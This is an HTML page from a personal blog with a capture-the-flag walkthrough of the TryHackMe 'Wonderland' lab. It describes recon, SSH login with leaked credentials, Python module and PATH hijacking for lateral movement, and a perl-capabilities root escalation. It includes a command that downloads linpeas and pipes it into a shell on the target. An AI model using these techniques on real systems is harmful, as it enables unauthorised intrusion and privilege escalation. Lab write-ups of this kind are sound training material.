@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<?xml-stylesheet href="styl.css" type="text/css" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pl">
+<head>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/prism.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/themes/prism.min.css"
+/>
+ <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
+<meta http-equiv="Content-Type" content="application/xhtml+xml; charset=UTF-8" />
+<meta name="keywords" content="personal page, fyqer">
+ <meta name="author" content="Daniel Gałeczka">
+<title>Fyqer_blog</title>
+<link rel="stylesheet" type="text/css" href="styl.css" />
+<link rel="stylesheet" href="styl.css">
+</head>
+<body>
+<div id="yah"></a></div>
+<div id="menu">
+<h2 id="luk">Menu</h2>
+<a href="index.html" class="link">/index</a> </br>
+<a href="index.html" class="link">/thm_writeups</a>
+<a href="index.html" class="link">/ctf_writeups</a>
+<a href="index.html" class="link">/other_writeups</a>
+<a href="About_author.html" class="link">/About_author</a>
+
+<p id="copy">&copy; copyright by ... Daniel Gałeczka</p></div>
+
+
+
+  <div class="content">
+          <p>
+
+░░░░██╗██╗░░░░░██╗░█████╗░███╗░░██╗██╗░░░██╗██╗░░░██╗
+░░░██╔╝██║░░░░░██║██╔══██╗████╗░██║╚██╗░██╔╝██║░░░██║
+░░██╔╝░██║░░░░░██║███████║██╔██╗██║░╚████╔╝░██║░░░██║
+░██╔╝░░██║░░░░░██║██╔══██║██║╚████║░░╚██╔╝░░██║░░░██║
+██╔╝░░░███████╗██║██║░░██║██║░╚███║░░░██║░░░╚██████╔╝
+╚═╝░░░░╚══════╝╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░</p>
+<a href="https://tryhackme.com/room/wonderland">
+    <div class="link">
+         <p>Link to the challenge</p>
+    </div>
+</a>
+
+<p><b> [1].Recon</b></p>
+<p> First step as always is the same - nmap, i found that 2 basic ports are open 80 and 22 that mean SSH and web server are avaialble.  </p>
+<img src="walkth/wonder1.jpg" width="550" height="150">       
+<p> After nmap scan and open a web browser, appeard a basic website without any sensitibe informations, i found nothing even after searching souce code. Next step i did was searching other directories of web server by <b>gobuster</b>: </p>
+<img src="walkth/wonder2.jpg" width="550" height="200">
+ <p> Gobuster found a  <b>/r</b> folder but nothing interensting wasn't there so i keep scanning but this time bruteforced url was :<b>http://10.10.26.148/r</b>, page looks same as previosly so i keep doing it. </p>
+ <p> Finally patch i found looked like this :</p>
+ <pre><code class="language-php">http://10.10.26.148/r/a/b/b/i/t</pre>
+<p> Frontend content of <b> http://10.10.26.148/r/a/b/b/i/t</b> show's nothing interensting so i looked at source code. </p>
+ <p>Source code show us probably credentials for a SSH server which was founded in first step of the recon.</p>
+<p><b>[2]SSH Server</b></p>
+<p>I successfully logged in and expected a user.txt but i coudn'nt find this, after this i realised that we do not have write access but we can have read acces, i get first flag in /root/ direcrory: </p>
+  <img src="walkth/wonder4.jpg" width="450" height="100">
+	
+<p> Next step was <b> sudo -l</b> command to get information about previlages we can escalate, additionaly i found executable .py file in alice directory, python3.6 has appeared, i have read, we can execute /bin/bash by putting a random.py which have to import random module and be in the same directory as executable.py file, this should in turn give us a rabbit user shell:  </p>
+  <img src="walkth/wonder5.jpg" width="250" height="60">
+  <p> Open a .py file as a rabbit user:</p>
+<img src="walkth/wonder6.jpg" width="450" height="100">
+  <p><b>After successfully previlage escalation i found nothing interesting in alice directory so i move to rabbit directory and found a ./teaParty file. which was the only tip to go further.</p>
+  <p> Unofortunately file wasn't in readable format so i had to make a http server by python3 -m http.server and copy file in our system then used a strings app to reverse binary file, content after string command:</p>
+    <img src="walkth/wonder7.jpg" width="550" height="250">
+	<p> So we found that "date" variable is called from relative same path... i had to 'touch' new fake 'date' file which bring me a bash shell as hatter user: </p>
+	<pre><code class="language-php"> "/bin/bash" > date
+chmod a+x date
+PATH=.:$PATH
+./teaParty
+whoami
+hatter</code></pre>
+<p> I moved to home directory of hatter user and cat a password file, few minutes later i realised that this is password for "hatter".</p>
+ <img src="walkth/wonder8.jpg" width="550" height="250">
+
+<p>Tried another time to cat root flag in alice directory but still didn't had permissions, the last finally step was run a linepeas diagnostic script which i used earlier but without any effect, this is simple tutorial: </p>
+ <pre><code class="language-c">curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh # Host
+sudo python -m SimpleHTTPServer 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
+</pre>
+ 
+
+<p>Script found that "perl" app capabiliies is set so it can bring us a root shell by setting uid to 0,  i moved to gtfobins to copy the command and we got the root!</p>
+
+	 <img src="walkth/wonder9.jpg" width="450" height="100">
+
+          <div class="clear"></div>
+      </div>
+
+
+</body>
+</html>
